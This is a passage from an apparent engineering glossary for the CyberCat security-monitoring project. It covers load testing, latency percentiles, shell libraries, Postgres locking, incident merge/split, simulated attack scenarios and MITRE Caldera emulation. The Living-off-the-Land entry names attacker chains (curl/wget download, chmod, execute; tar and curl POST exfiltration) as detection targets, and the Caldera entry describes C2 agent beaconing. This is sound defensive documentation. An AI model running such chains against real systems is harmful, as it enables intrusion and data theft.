values = [10, 12, 15, 20, 22, 25, 30, 50, 80, 200]   # ms
percentile(values, 50)   # → ~23.5  (median)
percentile(values, 95)   # → ~146   (the slow tail)
percentile(values, 99)   # → ~189   (worst 1%)
```

Sort the values, pick the index at `(N-1) × p/100`, interpolate between adjacent samples for non-integer indices. Exact, but O(N) memory and O(N log N) sort cost — fine for a load-test of 30000 requests, not for a streaming dashboard.

**For streaming / production**, you can't keep all observations. Two algorithms dominate:

1. **HDR Histogram** — bucketed counts with exponential bucket sizes. Fixed memory (a few KB) regardless of how many values you record. Trade tiny precision loss (configurable, e.g., ±0.1%) for bounded memory.
2. **t-digest** — clusters of weighted centroids, denser near the tails. Excellent for percentile estimation, mergeable across distributed workers. Used by Datadog, Elastic, ClickHouse, Spark.

CyberCat's harness uses exact computation because runs are bounded; production observability tools use one of the approximations.

**Why p50, p95, p99 specifically:**

- **p50 (median)** — the typical experience. Half the requests are faster, half slower. Insensitive to outliers.
- **p95** — "what's the experience for the slowest 5%?" Captures meaningful tail without being dominated by single outliers.
- **p99** — "what's the worst 1% experience?" Surfaces rare but impactful slowness (cold caches, GC pauses, lock contention).
- **p99.9 / p99.99** — for high-traffic services where 0.1% is still thousands of users. Less common in CyberCat-scale workloads.

**The mean trap, made concrete.** A pure load-test result:

```
99 requests at 10ms each
1 request at 10000ms (the cold start)
mean = (99*10 + 10000) / 100 = 109.9 ms
```

109.9ms — sounds bad! But the median is 10ms — most users feel a fast service. p99 is ~5000ms — there's a real outlier worth investigating. Reporting only the mean would mislead in both directions.

**The CyberCat reporting** in the load harness:

```python
# labs/perf/load_harness.py (simplified output)
{
  "rate_requested": 100,
  "rate_achieved": 100.0,
  "duration_s": 30,
  "requests_sent": 3001,
  "accepted_2xx": 3001,
  "failed_5xx": 0,
  "transport_errors": 0,
  "latency_ms": {
    "p50": 13,
    "p95": 235,
    "p99": 412
  },
  "acceptance_passed": true
}
```

That `latency_ms` block is what tells you whether the system is healthy under load — not the mean, not the max, but the percentiles.

**Why it exists:** Means are blind to skew. If 99 requests take 10ms and 1 takes 10s, the mean is 110ms — a number that describes neither group. Percentiles describe both: p50 = 10ms (most requests are fast), p95 / p99 reveal the slow tail. Most performance SLOs (Service Level Objectives) are stated as percentiles ("p95 < 200ms") because users feel the tail, not the mean.

**Where in CyberCat:** `labs/perf/load_harness.py` reports p50/p95/p99 per run. `docs/perf-baselines/2026-04-30-phase19-pre-perf.md` records baselines. The Phase 19 §A6 acceptance bar was "p95 detection latency < 500ms"; the verified-2026-05-01 result was 100/s × 30s clean run with p95 = 235ms.

**Where else you'll see it:** Every SRE / DevOps / observability tool reports them — Datadog, Grafana, Prometheus (with `histogram_quantile`), AWS CloudWatch, New Relic. SLO/SLI frameworks (Google SRE book) are built on percentiles. Even Kubernetes' resource requests indirectly track percentile behavior.

**Tradeoffs:** Tail percentiles need a lot of samples to be stable — p99 from 100 observations is noise. Approximation algorithms trade exact correctness for memory bounds (t-digest is the modern default). Combining percentiles across services is non-trivial — you can't average p95s; you have to merge raw histograms.

**Related entries:** [Load harness](#load-harness-rate-duration-transport-errors) · [Connection invalidation on restart](#connection-invalidation-on-restart)

---

#### Load harness (rate, duration, transport errors)
*Introduced: Phase 19 · Category: Verification*

**Intuition:** A load harness is a script that fires HTTP requests at a target rate for a target duration and reports what happened — how many succeeded, how many failed, how fast they were. CyberCat's harness shows whether the ingest pipeline can keep up under sustained load and how it degrades when it can't.

**Precise:** `labs/perf/load_harness.py` accepts `--rate <req/s>`, `--duration <seconds>`, target URL, payload template. It uses `httpx.AsyncClient` to fire requests in parallel (rate-paced via `asyncio.sleep`), records each response (status, latency, errors), and emits per-run metrics: requests sent, accepted (2xx), failed_5xx, transport_errors (connection refused, timeout, NXDOMAIN), p50/p95/p99 latency, achieved rate (vs requested), and `acceptance_passed: true|false` against a configurable bar.

**How it works (under the hood):**

**The pacing loop.** The naive approach — `for i in range(N): await client.post(...)` — fires requests sequentially and is bottlenecked by latency, not by rate. The right pattern is **fire-and-forget concurrent tasks** with a sleep between launches:

```python
# labs/perf/load_harness.py (simplified core)
async def run_load(rate: float, duration: float, url: str, payload: dict) -> dict:
    interval = 1.0 / rate                              # seconds between launches
    tasks: list[asyncio.Task] = []
    results: list[dict] = []
    start = time.monotonic()

    async with httpx.AsyncClient(timeout=httpx.Timeout(connect=5.0, read=10.0)) as client:
        while time.monotonic() - start < duration:
            task = asyncio.create_task(_fire_one(client, url, payload, results))
            tasks.append(task)
            await asyncio.sleep(interval)

        # Wait for all in-flight requests
        await asyncio.gather(*tasks, return_exceptions=True)

    return _aggregate(results, requested_rate=rate, duration=duration)
```

Each `asyncio.create_task` schedules a coroutine to run *concurrently* with the next iteration. `asyncio.sleep(interval)` paces the launches. `await asyncio.gather(*tasks)` at the end blocks until all in-flight requests finish.

**The per-request fire function:**

```python
async def _fire_one(client, url, payload, results):
    t0 = time.monotonic()
    try:
        resp = await client.post(url, json=payload)
        latency_ms = (time.monotonic() - t0) * 1000
        results.append({"status": resp.status_code, "latency_ms": latency_ms, "error": None})
    except (httpx.ConnectError, httpx.ReadTimeout, httpx.NetworkError) as e:
        latency_ms = (time.monotonic() - t0) * 1000
        results.append({"status": None, "latency_ms": latency_ms, "error": type(e).__name__})
```

A successful request has `status` and `latency_ms`. A connection failure (Postgres restart, NXDOMAIN, refused) is a **transport_error** — categorically different from a 5xx (which proves the server at least responded).

**The aggregator** computes the metrics from the raw list:

```python
def _aggregate(results, requested_rate, duration):
    accepted_2xx = sum(1 for r in results if r["status"] and 200 <= r["status"] < 300)
    failed_5xx = sum(1 for r in results if r["status"] and r["status"] >= 500)
    transport_errors = sum(1 for r in results if r["error"] is not None)
    latencies_ms = [r["latency_ms"] for r in results if r["status"] is not None]
    return {
        "rate_requested": requested_rate,
        "rate_achieved": len(results) / duration,
        "requests_sent": len(results),
        "accepted_2xx": accepted_2xx,
        "failed_5xx": failed_5xx,
        "transport_errors": transport_errors,
        "latency_ms": {
            "p50": percentile(latencies_ms, 50),
            "p95": percentile(latencies_ms, 95),
            "p99": percentile(latencies_ms, 99),
        },
        "acceptance_passed": (accepted_2xx / len(results)) >= 0.95,
    }
```

**Why client-side bottlenecks happen at high rates.** At `--rate 1000`, the harness needs to fire 1000 requests/s. Each request takes hundreds of microseconds of Python overhead just to schedule the task and serialize the JSON. Once the rate exceeds what the *client* can sustain, the harness lags — the achieved rate falls below the requested rate. This is exactly what Phase 19 §A6 v2 saw: the cct-agent client thrashed at 110% CPU at 1000/s while the backend stayed at 0.15% CPU. The architecture hadn't hit its limit; the harness had.

**Why the §A6 ceiling matters honestly.** Single-worker uvicorn processes one request at a time per OS process (despite asyncio — the GIL still serializes Python execution). Real throughput per worker maxes out around 100–200 req/s for moderate-complexity routes. Scaling means running multiple worker processes (uvicorn's `--workers N`) behind a load balancer. CyberCat's Phase 19 baseline captured this as a known ceiling, deferred multi-worker to Phase 21, and amended §A6 acceptance to "harness ships and reproduces the ceiling" — an honest artifact instead of a fudged number.

**Driver scripts** layer on top for repeatable scenarios:

```bash
# labs/perf/run_postgres_restart_test.sh (simplified)
docker compose exec -d backend python labs/perf/load_harness.py \
    --rate 100 --duration 30 --url http://localhost:8080/v1/events/raw &
sleep 10
docker compose restart postgres
wait
# Output: aggregator JSON; acceptance_passed if ≥95% accepted
```

The driver's job is to coordinate the chaos event (restart postgres at t=10s) with the load run. The harness itself is unaware of the restart — it just records what happened.

**Why it exists:** Asking "how fast is the ingest?" without a harness gets you "fast enough, I think." Asking with a harness gets you "100/s clean, 200/s starts queueing, 500/s the backend hits 100% CPU and 30% drop." That precision turns "we should probably scale" into "we'll hit the wall at exactly N — here's the action plan." Phase 19's §A6 amendment is a perfect example: the harness reproduced the architectural ceiling (~100/s on single-worker uvicorn) and the baseline doc captured it as "harness ships and reproduces the ceiling; multi-worker uvicorn deferred to Phase 21."

**Where in CyberCat:** `labs/perf/load_harness.py`. Driver scripts: `labs/perf/run_postgres_restart_test.sh`, `run_a6_load_test.sh`, `run_a6_load_test_v2.sh`. Baselines: `docs/perf-baselines/2026-04-30-phase19-pre-perf.md`. Verification log: memory entry `project_phase19_verifications_2026_05_01`.

**Where else you'll see it:** k6 (Grafana's load testing tool), Locust (Python), Gatling (Scala/JVM), Apache JMeter (the original), wrk and wrk2 (single-purpose HTTP benchmarks), Vegeta (Go). Every team that cares about throughput has one.

**Tradeoffs:** Client-side rate limiting at high rates can become the bottleneck (CyberCat's harness ran into this at 1000/s × 60s — the client thrashed before the backend did). Geographic / network realism is hard — local-loopback numbers aren't real-world numbers. The harness is for *capacity planning*, not benchmarking against competitors.

**Related entries:** [p50/p95/p99 percentiles](#p50--p95--p99-percentiles) · [Connection invalidation on restart](#connection-invalidation-on-restart)

---

### Bash sourcing & shared shell libraries
*Introduced: Phase 19.5 (chaos infra) · Category: Verification*

**Intuition:** `source path/to/lib.sh` is the Bash equivalent of an `import` statement — it pulls another file's functions and variables into the *current* shell so you can call them as if they were defined locally. The alias `. path/to/lib.sh` (a single dot) does exactly the same thing; the dot form is older and POSIX-portable, `source` is the bash-specific synonym.

**Precise:** Running `bash file.sh` forks a *child* process and executes the script there — anything defined inside dies with the child. Sourcing (`source file.sh` or `. file.sh`) executes the file's lines in the *current* shell process, so function definitions, variable assignments, and `set` flags persist after the file finishes. This is how shell "libraries" work: a file that defines functions but doesn't run anything top-level, intended to be sourced rather than executed. The convention is to make such files non-executable (no shebang execution) and to guard top-level side effects with `[[ "${BASH_SOURCE[0]}" == "${0}" ]]` checks if you want the file to be both runnable and sourceable. `BASH_SOURCE` is an array containing the call stack of source files — `BASH_SOURCE[0]` is the file currently executing, which lets a sourced library figure out its own path even when the caller is in a different directory.

**Why it exists:** Without sourcing, the only way to share Bash code is copy-paste. That works for two callers; it rots fast at five. CyberCat's chaos scenarios were the trigger — six scenario scripts (`labs/chaos/scenarios/kill_redis.sh`, `restart_postgres.sh`, etc.) plus a CI workflow (`.github/workflows/chaos-redis.yml`) all needed to compute the same four §A1 acceptance counters (sim tracebacks, backend tracebacks, event count in last 5 min, degraded-mode warning lines). Six copies of `grep -c "Traceback"` would drift the moment one scenario added a new degraded-mode log shape; one helper means changing the rule once.

**The sourcing dance.** The canonical pattern when a script needs to find a sibling helper regardless of cwd:

```bash
SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
# shellcheck source=../lib/evaluate.sh
. "$SCRIPT_DIR/../lib/evaluate.sh"
```

Three things to notice. First, `BASH_SOURCE[0]` is preferred over `$0` because `$0` is the *invoking* script, not the file currently running — they differ when the script itself was sourced. Second, the `cd ... && pwd` resolves any `..` or symlinks in the path. Third, the `# shellcheck source=` comment isn't a no-op — it tells the `shellcheck` linter where to follow the source so it can verify the helper's function names exist. Without it, shellcheck warns "can't follow non-constant source."

**Function scoping under `set -uo pipefail`.** A sourced helper inherits the caller's `set` flags. If the caller has `set -u` (error on unset variable) and `pipefail` (pipeline fails if any segment fails), the helper functions must be written defensively. Two specific gotchas hit `evaluate.sh`:

1. `local count` matters. Without `local`, the helper would assign to a global, polluting the caller's namespace. With `local`, the variable is scoped to the function body and disappears on return.
2. `grep -c` exits 1 when there are no matches but still prints `0`. Under `pipefail`, that exit-1 fires, and a naive `count=$(grep -c ... | tr ... || echo 0)` will produce `00` (the `0` from `grep -c` + the `0` from the fallback). The fix is to compute `count=$(... || true)` first, then `echo "${count:-0}"` once.

Both patterns are visible in `count_traceback_lines` at `labs/chaos/lib/evaluate.sh:52`.

**Where in CyberCat:** `labs/chaos/lib/evaluate.sh` defines five helpers — `count_traceback_lines`, `count_postgres_events_5min`, `count_degraded_warnings`, `capture_backend_log`, `print_acceptance_summary` — plus a `cleanup_chaos_state` trap helper. Sourced from six local scenario scripts (`labs/chaos/scenarios/*.sh`) and from `.github/workflows/chaos-redis.yml` as of 2026-05-04. Each scenario passes its own degraded-mode regex pattern to `count_degraded_warnings`, so the helper stays scenario-agnostic while the per-scenario rules live with the scenario.

**Where else you'll see it:** Almost every nontrivial bash codebase has this. Examples: `git`'s test suite (`t/test-lib.sh` is sourced by hundreds of `t*.sh` scripts), Homebrew's formulae (sourced helpers in `Library/Homebrew/`), most production deploy scripts (`deploy_lib.sh` sourced by `deploy_staging.sh` + `deploy_prod.sh`), `oh-my-zsh` plugins (each plugin is a sourced script), and most `.bashrc` / `.zshrc` configs (sourced at shell startup). Outside Bash: Python's `import`, Node's `require`/`import`, Lua's `require`, Tcl's `source` — every scripting language has the same construct, often with the same name.

**Tradeoffs:** Sourcing is implicit dependency injection — the helper functions appear in your namespace without an explicit declaration of *which* functions you're getting. Large libraries make this cognitively expensive (you can't tell at a glance which `count_*` came from where). The mitigation is keeping helper files small and topical (`evaluate.sh` is one purpose: chaos acceptance counters). The other tradeoff is shell-state pollution: a sourced file that runs `set -e` or modifies `IFS` at the top level changes the caller's shell behavior, often surprisingly. The convention is "library files only define things; they don't `set` flags or execute side effects."

**Related entries:** [Smoke tests vs unit tests vs integration tests](#smoke-tests-vs-unit-tests-vs-integration-tests) · [Load harness (rate, duration, transport errors)](#load-harness-rate-duration-transport-errors)

---

## Choreographed attack scenario
*Introduced: Phase 20* · *Category: Project Pattern*

**Intuition:** A scripted "fake attacker" — a Python `async` function that calls `SimulatorClient.post_event()` repeatedly with timed `await asyncio.sleep()` between events, simulating the real-time pacing of an attack. The script *posts* fake events to the API; it never executes real malicious commands. Phase 8's `credential_theft_chain.py` was the original; Phase 20 added five more.

**Precise:** A scenario module under `labs/simulator/scenarios/` exporting `SCENARIO_NAME`, an `async run(client: SimulatorClient, speed: float = 1.0) -> dict` entry point, and an optional `async verify(client: SimulatorClient) -> bool`. The `--speed` flag from `python -m labs.simulator` is a multiplier on real-time offsets — `--speed 0.1` compresses a 5-min real-time scenario into ~30s. Each `run()` returns a dict of event IDs and incident IDs touched for downstream assertion.

**Why it exists:** Without scripted scenarios, every test of the platform's correlation behavior requires hand-curling 8-15 events with carefully-timed delays and matching dedupe keys. Scenarios package the choreography so anyone can re-run any attack story by name. They also pair with the detection-as-code regression suite (each scenario ships a `.jsonl` fixture under `labs/fixtures/scenario/` that the pytest manifest replays).

**Where in CyberCat:** `labs/simulator/scenarios/credential_theft_chain.py` (Phase 8 prototype), `labs/simulator/scenarios/lateral_movement_chain.py` and four siblings (Phase 20). Registered in `labs/simulator/scenarios/__init__.py:7-12`.

**Where else you'll see it:** MITRE Caldera "operations" are a heavier version (live agent execution, not just event posting). Atomic Red Team's `.yaml` invocations are a similar idea at the host-execution level. SafeBreach and Cymulate are commercial BAS (breach-and-attack-simulation) platforms built around the same primitive.

**Tradeoffs:** Scenarios are *event simulations*, not *real attack execution*. They can't surface execution-level bugs (e.g., "does the platform correctly parse what auditd actually emits when bash runs curl"). They're great for testing the post-ingest pipeline (normalization, detection, correlation, incident formation) but have to be paired with real telemetry tests for end-to-end coverage.

**Related entries:** Detection-as-code regression · Pre-Phase-22 measurement vs guess

---

## Living off the Land (LotL) detection
*Introduced: Phase 20 (preview); Phase 22 (build)* · *Category: Security*

**Intuition:** "The attacker uses tools that are already on the system" — `curl`, `bash`, `ssh`, `chmod`, `tar`. Every individual binary is legitimate. The malicious thing is the *sequence*, not any single command. Detecting LotL is the opposite philosophy from antivirus (which looks for known-bad binary signatures) — you're looking at how legitimate tools are *used together*.

**Precise:** LotL ("Living off the Land") is an attacker technique where the adversary avoids importing custom malware and instead chains together already-installed system utilities. Defensive detection requires *behavior-chain analysis*: track sequences like `download (curl/wget) → arm (chmod +x) → execute (./payload)` or `enumerate (find/cat) → archive (tar) → exfiltrate (curl POST)`. Stateless per-event detectors (which match a single event's binary name) are blind to LotL because every individual binary is on the allow-list.

**Why it exists as a category:** Modern attackers prefer LotL because:
1. No malware to detonate → AV/EDR signature databases miss it.
2. The tools they use are also used by every admin → high background "noise" makes anomaly thresholds hard to set.
3. It's portable across Linux distros (the same `bash → curl → chmod` chain works on Debian, RHEL, Alpine).

CyberCat's `process_suspicious_child` detector (Phase 8) is the **opposite** approach: it has a hardcoded allow-list of suspicious *binary names* (PowerShell, Office, rundll32). That works for Windows because Windows attackers often use distinctive tools. It does NOT work for Linux because Linux attackers use `bash` and `curl` — which you can't allow-list without 100% false-positive rate. Phase 22 adds a *separate* detector specifically for LotL chains, leaving `process_suspicious_child` as-is for its Windows job.

**Where in CyberCat:** Will live at `backend/app/detection/rules/process_lotl_chain.py` (Phase 22, name TBD). Phase 20 surfaced 5 named scenarios that would feed it (A1-A5 in `docs/phase-20-summary.md`).

**Where else you'll see it:** MITRE ATT&CK has LOLBAS (Living Off the Land Binaries and Scripts) as an entire technique catalog (T1059, T1218). Crowdstrike, SentinelOne, and Sysdig all have proprietary LotL detection engines. The `Sigma` rule format has many "lolbas" rules.

**Tradeoffs:** LotL detection requires *stateful* per-session tracking (Redis windows per `(host, user, parent_pid)` triple), which is more expensive than stateless detection. False-positive tuning is harder — admin scripts that happen to match a chain look identical to attacker chains until you add operator-defined safe-list overrides.

**Related entries:** Choreographed attack scenario · Detection-as-code regression

---

## Postgres advisory locks
*Introduced: Phase 20* · *Category: Database*

**Intuition:** A named mutex you can grab from any Postgres session, used to serialize work that touches multiple rows or external state. (A "mutex" is a "mutual exclusion" primitive — only one holder at a time.) Unlike `SELECT FOR UPDATE` which locks specific rows, an advisory lock locks an *abstract name* (any int8 you choose) so multiple operations that need to be sequential can coordinate without holding row locks the whole time.

**Precise:** Postgres provides `pg_advisory_lock(int8)` and its variants. Two flavors matter:
- `pg_advisory_lock(k)` — session-level. Lock is held until `pg_advisory_unlock(k)` or session ends. Used for cross-transaction coordination.
- `pg_advisory_xact_lock(k)` — transaction-level. Lock is held until `COMMIT` or `ROLLBACK`. Released automatically. **This is the safer choice** for most use cases — no chance of forgetting to unlock.

CyberCat's `merge_incidents()` uses `pg_advisory_xact_lock` keyed on a deterministic hash of `(min(src,tgt), max(src,tgt))`. Why: a merge involves *two* incident rows. If two operators click "merge A → B" and "merge B → A" simultaneously, `SELECT FOR UPDATE` alone could deadlock (each session locks one row in different orders). The advisory lock keyed on the canonicalized pair forces both transactions to serialize on the same key — the second one blocks until the first commits.

**Why it exists:** Row locks (`SELECT FOR UPDATE`) work for single-row mutations but get tricky when you need multiple rows or external state (e.g., "send a webhook AND update the DB atomically — only one process at a time"). Advisory locks let you coordinate around an abstract identifier.

**Where in CyberCat:** `backend/app/correlation/merge.py:65-68` (the `_advisory_lock_key` helper + the `pg_advisory_xact_lock` call); `backend/app/correlation/split.py` uses the same pattern keyed on a single incident ID.

**Where else you'll see it:** Job queues built on Postgres (e.g., `pg-boss`, `graphile-worker`) use advisory locks to ensure only one worker picks up a given job. Schema migration tools like Alembic and Flyway use them to prevent two migration runs from racing.

**Tradeoffs:** Advisory locks are *advisory* — Postgres doesn't enforce them, your code has to. If one piece of code grabs the lock and another piece of code mutates the same data without grabbing the lock, you have a race. Also: the int8 key space is shared globally; collisions between unrelated subsystems are possible if you don't namespace your keys.

**Related entries:** Postgres enum mutability · Incident merge / split semantics

---

## Postgres enum mutability
*Introduced: Phase 20* · *Category: Database*

**Intuition:** Adding a value to a Postgres enum is easy (`ALTER TYPE ... ADD VALUE`). *Removing* a value is hard — Postgres doesn't have a clean `DROP VALUE`, so once you ship an enum value to production you basically own it forever. This shapes how you design schemas around enums.

**Precise:** `ALTER TYPE my_enum ADD VALUE IF NOT EXISTS 'new_val'` works since Postgres 9.6 and is fully transactional since 12. But there is no `ALTER TYPE my_enum DROP VALUE 'old_val'` even in Postgres 17. The workaround is a full type rebuild: `CREATE TYPE my_enum_v2 AS ENUM (...)`, `ALTER COLUMN ... TYPE my_enum_v2 USING (column::text::my_enum_v2)`, `DROP TYPE my_enum`. This requires writing every dependent column simultaneously and only works if no row references the value being removed.

CyberCat's `incident_status` enum got a `'merged'` value in migration 0009 (Phase 20). The `upgrade()` is symmetric (`ALTER TYPE ... ADD VALUE IF NOT EXISTS 'merged'`). The `downgrade()` is intentionally **asymmetric**: it drops the FK + column added in the same migration but does NOT remove `'merged'` from the enum. Documented in the migration docstring + ADR-0015. Operationally, we only ever downgrade fresh DBs in CyberCat, so the asymmetry is acceptable.

**Why it exists:** Enums are stored as 4-byte integers internally with a separate name table. Removing a name would orphan rows that reference its integer ID. Postgres prefers correctness over convenience here.

**Where in CyberCat:** `backend/alembic/versions/0009_incident_merge_split.py` — see the `upgrade()` / `downgrade()` pair and the docstring.

**Where else you'll see it:** Every Postgres project that uses native enums hits this eventually. The conventional workaround is "use a check-constrained text column instead of an enum" — easier to mutate, slightly more disk. Some teams blanket-ban Postgres enums for this reason.

**Tradeoffs:** Native enums give you compile-time-ish safety (the column rejects unknown values) and slightly smaller storage. Text-with-check-constraint trades that for operational flexibility. The choice depends on how often you expect the enum domain to change.

**Related entries:** Postgres advisory locks · Incident merge / split semantics

---

## Incident merge / split semantics
*Introduced: Phase 20* · *Category: Project Pattern*

**Intuition:** Two analyst affordances most SOC platforms have: **merge** ("these two incidents are the same investigation, fold them together") and **split** ("this evidence belongs to a different incident, lift it off"). They look symmetric but actually have different semantics under the hood — merge is a fold operation (source disappears), split is a fork operation (new child created, source continues to exist).

**Precise:** Merge: `merge_incidents(source_id, target_id, reason, actor)` bulk-moves all events/entities/detections/ATT&CK tags from source → target with `ON CONFLICT DO NOTHING`. Source becomes `status='merged'` and `parent_incident_id=target.id`. Target's severity becomes `max(src, tgt)`, confidence becomes `avg(src, tgt)`. Two `IncidentTransition` rows record the operation. SSE bus publishes `incident.merged` for both IDs. Concurrency safety: Postgres advisory lock keyed on `(min, max)` of the incident pair.

Split: `split_incident(source_id, event_ids, entity_ids, reason, actor)` *moves* (not copies) the requested events and entities from source → a brand-new child incident. Source aggregates get recomputed against remaining detections. Two `IncidentTransition` rows. SSE publishes `incident.split`. **Critically**, split children do NOT set `parent_incident_id` — that field unambiguously means "this incident was merged into the referenced one." The audit link for splits is the IncidentTransition row.

**Why it exists:** Without merge, the platform's correlators sometimes produce multiple incidents that an analyst recognizes as the *same* investigation. Triage fragments. Without split, evidence that belongs to a separate investigation gets stuck on the wrong incident, polluting its scope.

**Where in CyberCat:** `backend/app/correlation/merge.py`, `backend/app/correlation/split.py`. API routes at `backend/app/api/routers/incidents.py` (`POST /v1/incidents/{id}/merge-into` and `/split`). Frontend at `frontend/app/incidents/[id]/MergeModal.tsx` and `SplitButton.tsx`. Schema in migration 0009. Design rationale in `docs/decisions/ADR-0015-incident-merge-split.md`.

**Where else you'll see it:** Every commercial SOC platform (Splunk SOAR, Palo Alto XSOAR, IBM QRadar) has merge/split. Bug trackers like Linear and Jira use the same primitive ("mark as duplicate" = merge; "convert to subtask" = split-ish). Git's `cherry-pick + reset` is conceptually similar to split.

**Tradeoffs:** Merge is one-way in current implementation — there's no "unmerge" UI. The data model supports reversal (clear `parent_incident_id`, change status off `merged`) but no UX, by design. Confidence on the source post-split stays as-is rather than being recomputed (recomputing requires a confidence-reduction formula that's not well-defined when detections have heterogeneous confidence hints). Cross-kind merges absorb without re-kinding (target keeps its `kind`, regardless of source's `kind`).

**Related entries:** Postgres advisory locks · Postgres enum mutability · Choreographed attack scenario

---

## Pre-Phase-22 measurement vs guess
*Introduced: Phase 20* · *Category: Project Pattern*

**Intuition:** Before adding new detectors, *measure what you already catch*. Otherwise you're guessing what to add and will probably build the wrong thing. Phase 20's "no new detectors" guardrail exists so Phase 21 (Caldera) can give us a clean coverage baseline before Phase 22 starts writing LotL detectors.

**Precise:** Three sequential phases with a deliberate input/output contract:
- **Phase 20 (now-shipped):** Hand-craft 5 attack scenarios, run them, observe what fires. Record gaps. Output: hand-curated gap list (~5-8 named patterns).
- **Phase 21 (next):** Run MITRE Caldera against the lab. Caldera fires ~50-100 ATT&CK techniques automatically and produces a coverage scorecard. Output: systematic gap list (likely ~30+ patterns), *which is the union of (a) what Phase 20 found and (b) techniques Phase 20 didn't think to test*.
- **Phase 22:** Build new detectors targeting the combined gap list from 21. Re-run Caldera afterward to verify coverage went up.

The crucial property: **Phase 20 must not add detectors**. If it did, Phase 21's coverage scorecard would be polluted by speculative additions, and we'd have no idea whether each detector closed a real gap or just one we made up.

**Why it exists:** Most projects skip Phase 20+21 and jump straight to "add LotL detectors." The result is a long list of detectors that mostly catch things attackers don't actually do, and miss things they do. The measurement-first approach is more disciplined but takes ~2 phases longer.

**Where in CyberCat:** Codified in `docs/phase-20-plan.md` line 9 ("No new detectors"). Recurring "Likely gap (record, do not fix)" pattern in plan §A1, §A3, §A4, §A5. Final gap list in `docs/phase-20-summary.md`.

**Where else you'll see it:** Red-team / purple-team engagements use the same logic — run a known attack catalog (Atomic Red Team, MITRE Caldera) before commissioning custom detection content. SOC consultancies sell "detection coverage assessments" as their first engagement, before any "build new rules" engagement.

**Tradeoffs:** The discipline costs time — 2 phases of "measurement" before anything looks like a detection improvement. The product surface from Phase 20 (drills, merge/split) helps justify the investment. Without those wins, "two phases of measurement" is a hard sell.

**Related entries:** Living off the Land (LotL) detection · Choreographed attack scenario

---

## MITRE Caldera adversary emulation
*Introduced: Phase 21* · *Category: Detection*

**Intuition:** Caldera is "Selenium for attackers" — a server that drives a small program (Sandcat) on your target machine through a scripted list of MITRE-ATT&CK-tagged commands and reports what worked. You point it at your own infrastructure to *measure* whether your detection stack notices each step.

**Precise:** MITRE Caldera is an open-source adversary-emulation framework. The architecture is two pieces: a **C2 server** (the brain — a Python web app exposing a UI and REST API on port 8888) and **agents** like Sandcat (the body — small Go binaries that beacon to the C2, pull instructions, run them, return results). Operators define **adversary profiles** as ordered lists of **abilities**, where each ability is a YAML doc containing `(executor, platform, command, ATT&CK technique)`. Caldera ships ~80–150 Linux abilities in a curated bundle called **Stockpile**. An **operation** is a single execution of a profile against an agent group; the operation's **report** is the per-step record (which abilities ran, what they returned, when).

**How it works (under the hood):**

The **agent enrollment** flow: a fresh Sandcat binary starts with `-server <CALDERA_URL> -group <name>`. It POSTs to `/beacon` with its hostname, OS, paw (a unique ID), and the group name; Caldera registers it and returns instructions for the next pulse. Sandcat then polls every N seconds (default ~3 sec). The pulse loop is HTTP long-polling with a small payload — no persistent socket required.

The **operation lifecycle**:
1. POST `/api/v2/adversaries` with the ordered ability list → adversary is registered, returns `adversary_id`.
2. POST `/api/v2/operations` with `{adversary_id, planner_id, agent_group}` → server creates an operation, state moves to `running`.
3. The selected **planner** (e.g., `atomic` — sequential, deterministic) decides which ability to dispatch next. On each agent's beacon, the planner returns the next ability's command.
4. Sandcat runs the command, captures stdout/stderr/exit code, returns it on the next pulse. Caldera records this as a **step** with status (0 = success).
5. When the planner has no more abilities to dispatch, the operation moves to state `finished`.
6. GET `/api/v2/operations/{id}/report` returns the full per-agent step list — that's what our scorer reads.

The **planner** abstraction matters because not all profiles are sequential. Caldera ships planners like `batch` (run everything in parallel), `look` (look for facts before running). For coverage scoring we use `atomic` so the order of execution matches `atomic_ordering` exactly — which makes per-ability attribution to time windows unambiguous.

**Why it exists:** Hand-crafted attack scenarios (the Phase 20 simulator approach) are author-biased — you only test what you thought to test. Caldera flips this: the ability list is community-curated (MITRE + contributors), and running it gives you a *measured* coverage signal. The whole industry calls this "purple teaming" — defenders running known-attacker behavior to assess their own coverage.

**Where in CyberCat:** Caldera 5.0.0 runs in `infra/caldera/` (Dockerfile pinned to upstream tag, `local.yml` with our plugin set). Compose service in `infra/compose/docker-compose.yml` (profile `caldera`, default OFF, bound to 127.0.0.1:8888 only). Sandcat fetched on start by `infra/lab-debian/entrypoint.sh` when `CALDERA_URL` is set. Adversary profile + abilities live in `labs/caldera/`. Decision rationale in `docs/decisions/ADR-0016-caldera-emulation.md`.

**Where else you'll see it:** MITRE's own [`mitre/caldera`](https://github.com/mitre/caldera) repo. Atomic Red Team is a related project (similar ability YAMLs but no agent — runs from a control machine via SSH/WinRM). Commercial purple-team tools like AttackIQ, Mandiant Security Validation, and SafeBreach use the same primitive (ATT&CK-tagged abilities, agent-driven execution, coverage reporting). Most modern SOC consultancies run a Caldera-based "coverage assessment" before any rule-authoring engagement.

**Tradeoffs:** Caldera's ability quality varies — some Stockpile entries assume tools that aren't installed, some run the wrong command for the technique they claim. Curating a subset (Phase 21 chose ~25 abilities) costs author time but makes the scorecard interpretable. Caldera's UI is feature-rich but `--insecure` mode is acceptable only on a private bind; deploying in a multi-user environment requires generating cert material and configuring auth properly. Stockpile UUIDs rotate across major releases — pin the version and re-resolve on bumps.

**Related entries:** [MITRE ATT&CK (tactics, techniques, subtechniques)](#mitre-attck-tactics-techniques-subtechniques) · [Coverage scorecard methodology](#coverage-scorecard-methodology) · [ATT&CK technique attribution (set-overlap rule)](#attck-technique-attribution-set-overlap-rule) · [Fetch-on-start agent enrollment](#fetch-on-start-agent-enrollment)

---

## ATT&CK technique attribution (set-overlap rule)
*Introduced: Phase 21* · *Category: Detection*

**Intuition:** When you have an attacker action tagged "T1059" (parent) and a defender alert tagged "T1059.004" (subtechnique), are they the same thing? The answer is "close enough to count" — both name the same family. The set-overlap rule is the conservative way to encode "close enough" without going so loose that everything matches.

**Precise:** Given an *ability* (the attacker action) tagged with one ATT&CK technique `target` and a *detection* (the defender alert) carrying a list of `attack_tags`, the rule treats the detection as **attributable** to the ability iff `{tag, parent(tag)} ∩ {target, parent(target)}` is non-empty for any `tag` in the detection's tags. Where `parent(X)` strips the dot-suffix: `parent("T1059.004") == "T1059"`, `parent("T1059") == "T1059"`. This rule is **symmetric** — direction doesn't matter — and **conservative** — it doesn't pull in tactic-level matches or unrelated techniques.

**How it works (under the hood):**

